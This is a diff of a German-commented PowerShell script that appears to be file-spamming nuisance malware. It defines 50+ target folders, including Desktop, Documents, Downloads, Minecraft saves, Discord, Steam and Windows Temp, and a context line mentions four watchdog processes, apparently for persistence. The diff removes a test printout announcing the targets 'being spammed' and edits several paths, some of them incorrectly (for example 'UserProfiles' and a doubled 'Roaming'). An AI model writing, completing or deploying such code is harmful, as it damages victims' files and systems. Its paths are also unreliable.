@@ -57,7 +57,7 @@ $global:maxRounds = 150
 # ALLE ZIELE FÜR DATEIEN/ORDNER
 $desktop = [Environment]::GetFolderPath("Desktop")
 $documents = [Environment]::GetFolderPath("MyDocuments")
-$downloads = [Environment]::GetFolderPath("UserProfile") + "\Downloads"
+$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
 $music = [Environment]::GetFolderPath("MyMusic")
 $pictures = [Environment]::GetFolderPath("MyPictures")
 $videos = [Environment]::GetFolderPath("MyVideos")
@@ -70,7 +70,7 @@ $appData = $env:APPDATA
 $localAppData = $env:LOCALAPPDATA
 $temp = $env:TEMP
 $userProfile = $env:USERPROFILE
-$public = [Environment]::GetFolderPath("CommonDesktop")
+$public = [Environment]::GetFolderPath("CommonDesktopDirectory")
 $commonDocs = [Environment]::GetFolderPath("CommonDocuments")
 
 # ALLE ORDNER (50+ Ziele!)
@@ -98,12 +98,12 @@ $alleZiele = @(
     "$appData\.minecraft\mods",
     "$appData\.minecraft\config",
     "$appData\.minecraft\saves",
-    "$appData\Discord\Cache",
+    "$appData\Roaming\Discord",
     "$appData\Roaming\Discord\Cache",
     "$appData\Roaming\Spotify",
-    "$appData\Spotify\Cache", 
+    "$appData\Roaming\Spotify\Cache",
     "$appData\Roaming\Steam",
-    "$appData\Steam\cache",    
+    "$appData\Roaming\Steam\cache",
     
     # Windows
     "$env:SystemRoot\Temp",
@@ -118,12 +118,6 @@ $alleZiele = @(
     "C:\Users\Public\Documents",
     "C:\Users\Public\Downloads"
 )
-
-
-# ===== TEST =====
-Write-Host "Ziele werden gespamt:" -ForegroundColor Red
-$alleZiele | ForEach-Object { Write-Host "  - $_" }
-Start-Sleep -Seconds 10
 
 # ===== WATCHDOGS (4x) =====
 $watchdog1 = @"
